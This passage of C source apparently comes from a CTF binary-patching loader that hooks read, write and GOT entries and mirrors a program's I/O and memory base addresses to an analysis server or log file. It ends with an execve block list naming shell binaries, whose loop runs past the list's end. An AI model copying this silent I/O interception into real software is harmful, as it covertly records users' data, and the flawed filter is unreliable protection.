#else
            DEBUG_LOG("try to use udp analysis server");
            send_sockfd = my_socket(AF_INET, SOCK_DGRAM, 0);
            if(send_sockfd >=0) {
                DEBUG_LOG("udp analysis server socket open success");
                start_io_redirect_udp(send_sockfd, g_loader_param.analysis_server, libc_start_main_addr,
                                      stack_on_entry);
                my_close(send_sockfd);
            }
            else{
                DEBUG_LOG("udp analysis server socket open failed");
            }
#endif
        }
    }
    else{
        DEBUG_LOG("try to use local file recorder");
        my_memset(path, 0, sizeof(path));
        my_memset(file_name, 0, sizeof(file_name));
        my_strcpy(path, IO_REDIRECT_PATH, '\x00');
        my_memcpy(&path[my_strlen(path)], "/", 1);
        generate_random_str(file_name, 12);
        my_memcpy(&path[my_strlen(path)], file_name, my_strlen(file_name));
        my_memcpy(&path[my_strlen(path)], ".log", 4);
        //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
        send_sockfd = my_open(path, O_CLOEXEC | O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if (send_sockfd > 0) {
            DEBUG_LOG("local file recorder open success, file is:%s",path);
            start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
            my_close(send_sockfd);
        }
        else{
            DEBUG_LOG("local file recorder open failed, file is:%s",path);
        }
    }
}

static int g_redirect_io_fd;


static int __hook_dynamic_read(int fd,char* buf,ssize_t size){
    int ret = my_read(fd,buf,size);
    char packet[131082];
    int packet_len;
    if(ret > 0) {
        if (fd == STDIN_FILENO) {
            if (g_redirect_io_fd > 0) {
                build_packet(DATA_IN, buf, ret, packet, &packet_len);
                my_write_packet(g_redirect_io_fd, packet, packet_len);
            }
            if(buf[ret-1] == '\r'||buf[ret-1] == '\n' )
                start_shell_io_inline(buf,ret-1);
            else{
                start_shell_io_inline(buf,ret);
            }
        }
    }
    return ret;
}
static int __hook_dynamic_write(int fd,char* buf,ssize_t size){
    int ret = my_write(fd,buf,size);
    char packet[131082];
    int packet_len;
    if(ret > 0 ) {
        if (g_redirect_io_fd > 0) {
            if (fd == STDOUT_FILENO) {
                build_packet(DATA_OUT, buf, ret, packet, &packet_len);
                my_write_packet(g_redirect_io_fd, packet, packet_len);
            } else if (fd == STDERR_FILENO) {
                build_packet(DATA_ERR, buf, ret, packet, &packet_len);
                my_write_packet(g_redirect_io_fd, packet, packet_len);
            }
        }
    }
    return ret;
}


IN_LINE void dynamic_io_redirect_hook(){
    {
        char read_str[] ={"read"};
        void* hook_read_handler = (void*)__hook_dynamic_read;
        char* read_handler = lookup_symbols(read_str);
        if(read_handler!=NULL)
            dynamic_hook_function(read_handler,hook_read_handler);
    }
    {
        char write_str[] ={"write"};
        void* hook_write_handler = (void*)__hook_dynamic_write;
        char* write_handler = lookup_symbols(write_str);
        if(write_handler!=NULL)
            dynamic_hook_function(write_handler,hook_write_handler);
    }

}

IN_LINE void start_inline_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
    int use_file = 0;
    char path[0x200];
    char file_name[0x100];
    char packet[131082];
    int packet_len;
    if (g_loader_param.analysis_server.sin_addr.s_addr != 0 && g_loader_param.analysis_server.sin_port != 0) {
        struct timeval timeout;
        timeout.tv_sec = TCP_TIME_OUT;
        timeout.tv_usec = 0;
        g_redirect_io_fd = my_socket(AF_INET, SOCK_STREAM, 0);
        if (g_redirect_io_fd >= 0) {
            DEBUG_LOG("tcp analysis server socket open success");
            int res = connect_timeout(g_redirect_io_fd, (struct sockaddr *) &g_loader_param.analysis_server, sizeof(struct sockaddr),
                                      &timeout);
            if (res == 1) {
                DEBUG_LOG("connect to tcp analysis server success");
                char* heap_base = (char*)get_heap_base();
                char* elf_base = (char*)get_elf_base();
                char* stack_base = (char*)stack_on_entry;
                build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
                my_write_packet(g_redirect_io_fd,packet,packet_len);
                dynamic_io_redirect_hook();
            } else {
                DEBUG_LOG("connect to tcp analysis server failed");
                my_close(g_redirect_io_fd);
                g_redirect_io_fd = 0;
                use_file = 1;
            }
        } else {
            DEBUG_LOG("cp analysis server socket open failed");
            use_file = 1;
        }
    }
    if(use_file == 1){
        my_memset(path,0,sizeof(path));
        my_memset(file_name,0,sizeof(file_name));
        my_strcpy(path,IO_REDIRECT_PATH,'\x00');
        my_memcpy(&path[my_strlen(path)],"/",1);
        generate_random_str(file_name,12);
        my_memcpy(&path[my_strlen(path)],file_name,my_strlen(file_name));
        my_memcpy(&path[my_strlen(path)],".log",4);
        //g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRWXU|S_IRWXG|S_IRWXO);
        g_redirect_io_fd = my_open(path,O_CLOEXEC|O_RDWR|O_CREAT,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(g_redirect_io_fd>0){
            DEBUG_LOG("local file recorder open success, file is:%s",path);
            char* heap_base = (char*)get_heap_base();
            char* elf_base = (char*)get_elf_base();
            char* stack_base = (char*)stack_on_entry;
            build_packet(BASE_ELF,(char*)&elf_base,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            build_packet(BASE_LIBC,(char*)&libc_start_main_addr,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            build_packet(BASE_STACK,(char*)&stack_base,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            build_packet(BASE_HEAP,(char*)&heap_base,sizeof(char*),packet,&packet_len);
            my_write_packet(g_redirect_io_fd,packet,packet_len);
            dynamic_io_redirect_hook();
        }
        else{
            DEBUG_LOG("local file recorder open failed, file is:%s",path);
        }
    }
}


IN_LINE void start_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
    int res  = start_sandbox_io_redirect();
#if USE_IO_INLINE_REDIRECT == 1
    if(res == -1){
        start_inline_io_redirect(libc_start_main_addr,stack_on_entry);
        DEBUG_LOG("USE_IO_INLINE_REDIRECT");
    }
#else
    if(res == -1) {
        DEBUG_LOG("USE_COMMON_IO_REDIRECT");
        start_common_io_redirect(libc_start_main_addr, stack_on_entry);
    }
#endif

}






IN_LINE Elf_Shdr* get_elf_section_by_index(long index,char* elf_base){
    Elf_Ehdr* ehdr = (Elf_Ehdr*) elf_base;
    Elf_Shdr* shdr = (Elf_Shdr*)(elf_base + ehdr->e_shoff + index*ehdr->e_shentsize);
    return shdr;
}

IN_LINE Elf_Shdr* get_elf_shstrtab(char* elf_base){
    Elf_Ehdr* ehdr = (Elf_Ehdr*) elf_base;
    return get_elf_section_by_index(ehdr->e_shstrndx,elf_base);
}

IN_LINE Elf_Shdr* get_elf_section_by_name(char* section_name,char* elf_base){
    Elf_Ehdr* ehdr = (Elf_Ehdr*) elf_base;
    int i = 0;
    Elf_Shdr* shstrtab_section = get_elf_shstrtab(elf_base);
    if(shstrtab_section == NULL)
        return NULL;
    char* strtab = (char*)(elf_base + shstrtab_section->sh_offset);
    for(i=0;i<ehdr->e_shnum;i++){
        Elf_Shdr* shdr = (Elf_Shdr*)(elf_base + ehdr->e_shoff + i*ehdr->e_shentsize);
        if(my_strcasecmp((char*)&strtab[shdr->sh_name],section_name)==0)
            return shdr;
    }
    return NULL;
}


IN_LINE void process_got_hook(char* name,Elf_Sym* symbol,char* so_base){
#if(PATCH_DEBUG==1)
    my_printf("Process _hook_got_:  %s  Start\n",name);
#endif
    long old_plt_vaddr = 0;
    old_plt_vaddr = my_strtol(name,NULL,16);
    if(old_plt_vaddr == 0){
#if (PATCH_DEBUG==1)
        my_printf("Process _hook_got_:  %s  Failed , unable get vaddr of name\n",name);
#endif
        return;
    }
    char* new_addr = (char*)g_loader_param.patch_data_mmap_code_base+symbol->st_value;
    DEBUG_LOG("HOOK_GOT: 0x%lx --> 0x%lx",old_plt_vaddr,new_addr);
    dynamic_hook_function((void*)old_plt_vaddr,(void*)new_addr);
}

IN_LINE void process_elf_hook(char* symbol_name,Elf_Sym* symbol,char* so_base){
#if(PATCH_DEBUG==1)
    my_printf("Process _hook_elf_:  %s  Start\n",symbol_name);
#endif
    long need_modify_vaddr = my_strtol(symbol_name,NULL,16);
    if(need_modify_vaddr == 0){
#if (PATCH_DEBUG==1)
        my_printf("Process _hook_elf_:  %s  Failed , unable get vaddr of name\n",symbol_name);
#endif
        return;
    }
    char* new_addr = (char*)g_loader_param.patch_data_mmap_code_base+symbol->st_value;
    DEBUG_LOG("HOOK_ELF: 0x%lx --> 0x%lx",need_modify_vaddr,new_addr);
    dynamic_hook_function((void*)need_modify_vaddr,(void*)new_addr);

}

IN_LINE void process_call_hook(char* call_addr,Elf_Sym* symbol,char* so_base){
#if(PATCH_DEBUG==1)
    my_printf("Process _hook_call_:  %s  Start\n",call_addr);
#endif
    long need_modify_vaddr = my_strtol(call_addr,NULL,16);
    if(need_modify_vaddr == 0){
#if (PATCH_DEBUG==1)
        my_printf("Process _hook_call_:  %s  Failed , unable get vaddr of name\n",call_addr);
#endif
        return;
    }
    char* new_addr = (char*)g_loader_param.patch_data_mmap_code_base+symbol->st_value;
    DEBUG_LOG("HOOK_CALL: 0x%lx --> 0x%lx",need_modify_vaddr,new_addr);
    dynamic_hook_call((void*)need_modify_vaddr,(void*)new_addr);
}


IN_LINE void process_hook(char* so_base){
    Elf_Shdr* symtab_section = get_elf_section_by_name(".symtab",(char*)so_base);
    long sym_offset = symtab_section->sh_offset;
    long sym_entsize = symtab_section->sh_entsize;
    long sym_size = symtab_section->sh_size;
    long sym_num = sym_size/sym_entsize;
    long sym_link = symtab_section->sh_link;
    Elf_Shdr* strtab_section = get_elf_section_by_index(sym_link,(char*)so_base);
    char* strtab = (char*)(so_base + strtab_section->sh_offset);
    int i = 0;
    for(i=0;i<sym_num;i++){
        Elf_Sym* symbol = (Elf_Sym*)(so_base + sym_offset + i*sym_entsize);
        char* symbol_name = (char*)(&strtab[symbol->st_name]);
        if(my_strncasecmp(symbol_name,"__hook_got_",my_strlen("__hook_got_"))==0)
            process_got_hook(&symbol_name[my_strlen("__hook_got_")],symbol,(char*)so_base);
        else if(my_strncasecmp(symbol_name,"__hook_elf_",my_strlen("__hook_elf_"))==0)
            process_elf_hook(&symbol_name[my_strlen("__hook_elf_")],symbol,(char*)so_base);
        else if(my_strncasecmp(symbol_name,"__hook_call_",my_strlen("__hook_call_"))==0)
            process_call_hook(&symbol_name[my_strlen("__hook_call_")],symbol,(char*)so_base);
        /*
        else if(strncasecmp(symbol_name,"__hook_start_",strlen("__hook_start_"))==0)
            process_start_hook(&symbol_name[strlen("__hook_start_")],symbol,file_desc,so_base);
            */
    }
}

/*
IN_LINE void dynamic_hook_process_execve(){
    char execve_str[] ={"execve"};
    void* hook_handler = (void*)__hook_dynamic_execve;
    char* execve_handler = lookup_symbols(execve_str);
    if(execve_handler==NULL)
        return;
    dynamic_hook_function(execve_handler,hook_handler);
}

IN_LINE void dynamic_hook_process_mmap(){
    char mmap_str[] ={"__mmap"};
    char* mmap_handler = lookup_symbols(mmap_str);
    if(mmap_handler==NULL)
        return;
}

 */


IN_LINE void init_hook_env(){
    g_patch_code_slot = (PATCH_CODE_SLOT*)my_mmap((void*)(get_elf_base() - 0x100000),UP_PADDING(MAX_PATCH_NUM*sizeof(g_patch_code_slot),0x1000),PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    DEBUG_LOG("g_patch_code_slot is 0x%lx",g_patch_code_slot);
    if(g_patch_code_slot<=0) {
        g_patch_code_slot = NULL;
        g_patch_code_index = 0;
    }
    else{
        g_patch_code_index = 0;
    }
}

IN_LINE void dynamic_hook_process(Elf_Ehdr* ehdr){

    process_hook((char*)ehdr);
    //dynamic_hook_process_mmap();
    //dynamic_hook_process_execve();
}


void _start(LIBC_START_MAIN_ARG,void* first_instruction,LOADER_STAGE_THREE* three_base_tmp) {
    g_elf_base = (char*)DOWN_PADDING((char*)first_instruction-three_base_tmp->first_entry_offset,0x1000);
    DEBUG_LOG("stage_three_start");
    DEBUG_LOG("g_elf_base: 0x%lx",g_elf_base );
    DEBUG_LOG("patch_data_mmap_file_base: 0x%lx",three_base_tmp->patch_data_mmap_file_base);
    DEBUG_LOG("patch_data_mmap_code_base: 0x%lx",three_base_tmp->patch_data_mmap_code_base);

    if(check_elf_magic(g_elf_base)==-1){
        DEBUG_LOG("g_elf_base is wrong,not elf header");
        my_exit(-1);
        return;
    }
    char *stack_base = 0;
    char **ev = &UBP_AV[ARGC + 1];
    int i = 0;
    char libc_start_main_str[] ={"__libc_start_main"};
    char* target_entry = lookup_symbols(libc_start_main_str);
    my_memcpy(&g_loader_param,three_base_tmp,sizeof(LOADER_STAGE_THREE));
    g_errno_handler = NULL;
    while (ev[i] != NULL)
        i++;
    if (i >= 1)
        stack_base = (char *) UP_PADDING((long) ev[i - 1], 0x1000);
    else
        stack_base = (char *) UP_PADDING((long) ev[i], 0x1000);
    DEBUG_LOG("stack_base is: 0x%lx",stack_base);
    //parent should die before child
    init_hook_env();
    start_io_redirect(target_entry,stack_base);
    dynamic_hook_process((Elf_Ehdr*)((char*)three_base_tmp + sizeof(LOADER_STAGE_THREE)));
    //destory_patch_data();
}

/*total four type hook support
* 1. __hook_elf_addr
* 2. __hook_got_addr
* 3. __hook_lib_addr
* 4. __hook_call_addr
*/

/*
static void __hook_elf_0xfffffff(char* buf,unsigned int length){

}

static void __hook_call_0x08048785(int flag,char* buf){

}

static char* __hook_got_0x080484D0(int length){

}
 */

/*
 * once_time
static int __hook_elf_0x4008c5(){
    DEBUG_LOG("__hook_elf_0x4008c5");
    int(*ori)() = (int(*)())hook_address_helper((void*)0x4008c5);
    dynamic_unhook(ori);
    ori();
    dynamic_rehook(ori);
}

static int __hook_got_0x4006D0(char* format,...){
    void(*vprintf_handler)(const char *,va_list) = lookup_symbols("vprintf");
    if(vprintf_handler!=NULL) {
        DEBUG_LOG("__hook_got_0x4006D0_vprintf");
        va_list args;       //定义一个va_list类型的变量，用来储存单个参数
        va_start(args, format); //使args指向可变参数的第一个参数
        vprintf_handler(format, args);  //必须用vprintf等带V的
        va_end(args);       //结束可变参数的获取
    }
    else{
        DEBUG_LOG("__hook_got_0x4006D0_puts");
        my_puts(format);
    }
}

static int __hook_call_0x4009DF(int fd,char* buf,int len){
    DEBUG_LOG("__hook_call_0x4009DF");
    return (int)my_read(fd,buf,len);
}
*/

/*
 * x86_nopie_dynamic_test
static void * __hook_got_0x80484C0(int size){
    //malloc
    my_printf("__hook_got_0x80484C0\n");
    void*( *malloc_handler)(int) = (void*(*)())lookup_symbols("malloc");
    if(malloc_handler!=NULL)
        return malloc_handler(size);
    else
        return NULL;
}

static void __hook_call_0x8048838(){
    void(*ori)() = (void(*)())hook_address_helper((void*)0x80486A0);
    my_printf("__hook_call_0x8048838\n");
    ori();
}

static void __hook_elf_0x8048642(){
    my_printf("__hook_elf_0x8048642\n");
    void(*ori)() = (void(*)())hook_address_helper((void*)0x8048642);
    dynamic_unhook(ori);
    ori();
    dynamic_rehook(ori);
}*/



static int __hook_dynamic_execve(char *path, char *argv[], char *envp[]){
    char black_bins[][20] = {"/bin/sh","/bin/bash","sh","cat","ls"};
    char* black_bin = NULL;
    //my_puts("__hook_dynamic_execve success");
    for(int i=0;;i++) {
        black_bin = black_bins[i];
        if(black_bin == NULL)
            break;
        if(my_strstr(path,black_bin)!=NULL)
            return -1;
    }
    //my_execve(path,(char**)argv,(char**)envp);
    return 0;
}